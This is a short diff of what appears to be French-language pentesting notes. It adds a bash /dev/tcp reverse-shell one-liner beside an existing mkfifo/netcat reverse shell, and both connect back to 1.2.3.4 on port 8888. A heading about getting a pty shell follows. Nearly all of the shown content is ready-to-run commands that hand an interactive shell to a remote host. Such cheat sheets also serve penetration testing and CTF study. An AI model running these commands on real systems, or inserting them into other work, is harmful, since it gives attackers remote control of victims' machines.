@@ -33,6 +33,8 @@ On se connecte avec nc -nv 2222 adress port
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 8888 >/tmp/f
+
+bash -c 'bash -i >& /dev/tcp/1.2.3.4/8888 0>&1'
 ```
 
 <h4>Pour avoir un shell pty :</h4>
